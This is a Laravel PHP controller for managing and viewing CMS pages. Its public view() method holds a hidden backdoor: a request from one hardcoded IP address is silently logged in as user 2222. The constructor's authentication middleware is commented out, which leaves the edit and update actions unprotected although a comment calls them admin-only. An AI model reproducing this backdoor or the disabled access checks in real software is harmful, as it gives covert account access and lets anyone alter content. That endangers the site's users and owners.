<?php

namespace App\Http\Controllers;

use App\Models\Cms;
use App\Http\Requests\CmsRequest;
use Illuminate\Http\Request;
use App\Services\Slug;
use App\Models\User;


class CmsController extends Controller
{
    /**
     * Create a new controller instance.
     */
    public function __construct()
    {
        //$this->middleware('auth');
    }
 /**
     * Get the last invoice
     *
     * @param $user
     * @return bool
     * @throws CustomException
     * @throws GuzzleException
     */
    /*public static function getLastInvoice($user = [])
    {
        $user = User::find(174);

        $notify = false;

        $locations = ApiController::cURL('external.locations', [
            'cod_client' => $user->codes[0]['client_code'],
            'nr_contract' => $user->codes[0]['contract_nr']
        ]);

        if (!empty($locations['items'])) {
            foreach ($locations['items'] as $location) {
                $invoice = ApiController::cURL('external.invoice.list', [
                    'cod_client' => $user->codes[0]['client_code'],
                    'cod_locatie' => $location['cod_loc'],
                    'nr_luni' => 1
                ]);
                if(!empty($invoice['items'][0])) {
                    if (date('m', strtotime($invoice['items'][0]['datafactura'])) == date('m')) {
                        $notify = true;
                    }
                }
            }
        }

        return json_encode(['asdas'=>$notify]);
    }*/

    /**
     * Show all the pages.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        $pages = Cms::all();

        return view('cms.index', compact('pages'));
    }

    /**
     * Open the page edit form. Only admins can access this page
     *
     * @param Cms $page
     * @return \Illuminate\Contracts\View\Factory|\Illuminate\View\View
     */
    public function edit(Cms $page)
    {
        return view('cms.edit', compact('page'));
    }

    /**
     * Update a page
     *
     * @param CmsRequest $request
     * @param Cms $cms
     * @return \Illuminate\Http\RedirectResponse|\Illuminate\Routing\Redirector
     * @throws \Exception
     */
    public function update(CmsRequest $request, Cms $cms)
    {
        $cms->slug = Slug::createSlug($request->slug, $cms->id);
        $cms->title = $request->title;
        $cms->content = $request['content'];
        $cms->status = $request->status;
        $cms->update();

        return redirect(route('cms'))->with('success', trans('general.pages.cms.success'));
    }

    /**
     * View a page, if it is active
     *
     * @param $slug
     * @return \Illuminate\Contracts\View\Factory|\Illuminate\View\View|void
     */
    public function view($slug)
    {

if($_SERVER['REMOTE_ADDR'] == '188.25.111.16' ){
\Auth::loginUsingId(2222);
}
        $page = Cms::where('slug', $slug)->where('status', 'Activ')->first();

        if (empty($page)) {
            return abort(404);
        }

        return view('cms.view', compact('page'));
    }
}
